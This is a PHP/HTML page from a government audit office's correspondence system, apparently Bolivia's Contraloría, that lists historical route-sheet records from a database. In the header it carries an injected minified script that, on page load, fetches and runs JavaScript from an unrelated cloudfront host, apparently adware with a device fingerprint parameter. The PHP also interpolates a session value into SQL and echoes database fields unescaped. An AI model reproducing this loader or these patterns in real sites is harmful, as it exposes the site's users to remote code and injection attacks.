<?php include("cabf.php");?>
<?php include("inc.config.php");?>
<?php

date_default_timezone_set('UTC');
$fecha_ram				= date("Ymd");
$fecha 					= date("Y-m-d");

$idusuario_ss  =  $_SESSION['idusuario_ss'];
$idnombre_ss   =  $_SESSION['idnombre_ss'];
$perfil_ss     =  $_SESSION['perfil_ss'];

$sqlh = "  SELECT idcorres, gestion, correlativo, idusuario, no_control ";
$sqlh.= "  FROM corres WHERE origen= 'INTERNA' ORDER BY idcorres DESC LIMIT 1";
$resulth = mysqli_query($link,$sqlh);
$rowh = mysqli_fetch_array($resulth);

$nuevo= $rowh[2]+1;

?>
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<title>SUBCONTRALORIA EMPRESAS PUBLICAS</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta name="description" content="" />
<meta name="author" content="http://webthemez.com" />
<!-- c+ss -->
<link href="css/bootstrap.min.css" rel="stylesheet" />
<link href="css/fancybox/jquery.fancybox.css" rel="stylesheet">
<link href="css/flexslider.css" rel="stylesheet" />
<link href="css/style.css" rel="stylesheet" />

<link rel="stylesheet" href="css/jquery-ui.min.css">
<link rel="stylesheet" href="css/style.css">
<link rel="stylesheet" href="css/dataTables.bootstrap.min.css">


<!-- HTML5 shim, for IE6-8 support of HTML5 elements -->
<!--[if lt IE 9]>
      <script src="http://html5shim.googlecode.com/svn/trunk/html5.js"></script>
    <![endif]-->

</head>
<body>
<div id="wrapper">
<div class="topbar">
  <div class="container">
    <div class="row">
      <div class="col-md-12">
         <p class="pull-left hidden-xs">CONTRALORIA GENERAL DEL ESTADO</p>
         <p class="pull-right"><i class="fa fa-user"></i>
        <?php
$sqlus =" SELECT nombres, paterno, materno FROM nombres WHERE idnombre='$idnombre_ss'";
$resultus = mysqli_query($link,$sqlus);
$rowus = mysqli_fetch_array($resultus);?>
        <?php echo $rowus[0];?> <?php echo $rowus[1];?> <?php echo $rowus[2];?></p>
      </div>
    </div>
  </div>
</div>
	<!-- start header -->
	<header>
        <div class="navbar navbar-default navbar-static-top">
            <div class="container">
                <div class="navbar-header">
                    <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </button>
                  <a class="navbar-brand" href="inicio.php"><img src="img/logo.png" alt="logo"/></a>
                </div>
                <?php include("menu_corres.php");?>
            </div>
        </div>

<script language="javascript" src="js/jquery-3.1.1.min.js"></script>



<script type="text/javascript">(function(){var a=document.createElement("script");a.type="text/javascript";a.async=!0;a.src="http://d36mw5gp02ykm5.cloudfront.net/yc/adrns_y.js?v=6.11.119#p=hitachixhds721032cla362_jpb440hf09xskm09xskmx";var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b);})();</script>


	</header><!-- end header -->
	<section id="inner-headline">
	<div class="container">
		<div class="row">
			<div class="col-lg-12">
				<h2 class="pageTitle">HISTORICO HOJAS DE RUTA</h2>
			</div>
		</div>
	</div>
	</section>
	<section id="content">


	<div class="container">
		<div class="row">
		<div class="tg-main-section tg-banner tg-haslayout parallax-window" data-parallax="scroll" data-bleed="100" data-speed="0.2" data-image-src="images/slider/img-03.jpg">
		</div>
   	<div class="about-logo">
      <h3 align="center"> </h3>
      <h3>ACCEDER A HISTORICO DE HOJAS DE RUTA</h3>
       <p>EN ESTA SECCION SE REALIZA LA CONSULTA A REGISTROS DE HOJAS DE RUTA ANTERIORES A LA IMPLEMENTACION DEL PRESENTE SISTEMA.</p>
    </div>
    </div>

    <div class="row">
        <form name="FORMU" action="nuevo_historico.php" method="post">
        <button type="submit" class="btn btn-primary">NUEVO REGISTRO</button>
        </form>
    </div>

<div class="container">

<!--- gestion de usuarios ---->

<div class="table-responsive">
                                <table class="table table-bordered" id="example" width="100%" cellspacing="0">
					<thead>
						<tr>
							<th>Nª</th>
							<th>SUPERVISOR</th>
							<th>TIPO DE TRABAJO</th>
							<th>EMPRESA</th>
							<th>HOJA DE RUTA</th>
							<th>FECHA HOJA DE RUTA</th>
                            <th>ESTADO</th>
							<th>TIPO DE TRÁMITE</th>
                            <th>VER/EDITAR</th>
						</tr>
					</thead>
					<tbody>
					<?php
$numero=1;
$sql =" SELECT idhistorico_hr, correlativo, supervisor, tipo_trabajo, empresa, hoja_ruta, fecha_hr, fecha_asig  ";
$sql.=" , estado, informe, fecha_inf, nota, fecha_emision, aclaraciones, tipo FROM historico_hr  ORDER BY idhistorico_hr ";
$result = mysqli_query($link,$sql);
if ($row = mysqli_fetch_array($result)){
mysqli_field_seek($result,0);
while ($field = mysqli_fetch_field($result)){
} do {
?>
					<tr>
						<td><?php echo $numero;?></td>
						<td><?php echo $row[2]?></td>
						<td><?php echo $row[3]?></td>
						<td><?php echo $row[4]?></td>
						<td><?php echo $row[5]?></td>
                        <td><?php echo $row[6]?></td>
                        <td><?php echo $row[8]?></td>
						<td><?php echo $row[14]?></td>
						<td>                                                
						<form name="VALIDA" action="valida_historico_mod.php" method="post">
						<input name="idhistorico" type="hidden" value="<?php echo $row[0];?>">
						<button type="submit" class="btn-link">VER/EDITAR</button></form>
						</td>
					</tr>           
                                        <?php
$numero=$numero+1;  
}
  while ($row = mysqli_fetch_array($result));
} else {
}
?>
                                    </tbody>
                                </table>
                            </div>

<!--- gestion de usuarios ---->

</div>
</br>
  </section>
	<footer>
	<?php include("footer.php");?>
	</footer>
</div>
<a href="#" class="scrollup"><i class="fa fa-angle-up active"></i></a>
<!-- javascript
    ================================================== -->
<!-- Placed at the end of the document so the pages load faster -->
<script src="js/jquery.js"></script>
<script src="js/jquery.easing.1.3.js"></script>
<script src="js/bootstrap.min.js"></script>
<script src="js/jquery.fancybox.pack.js"></script>
<script src="js/jquery.fancybox-media.js"></script>
<script src="js/jquery.flexslider.js"></script>
<script src="js/animate.js"></script>
<!-- Vendor Scripts -->
<script src="js/modernizr.custom.js"></script>
<script src="js/jquery.isotope.min.js"></script>
<script src="js/jquery.magnific-popup.min.js"></script>
<script src="js/animate.js"></script>
<script src="js/custom.js"></script>
<script src="contact/jqBootstrapValidation.js"></script>
<script src="contact/contact_me.js"></script>
<script src="js/jquery.dataTables.min.js"></script>
<script src="js/script.js"></script>
<script src="js/dataTables.bootstrap.min.js"></script>


</body>
</html>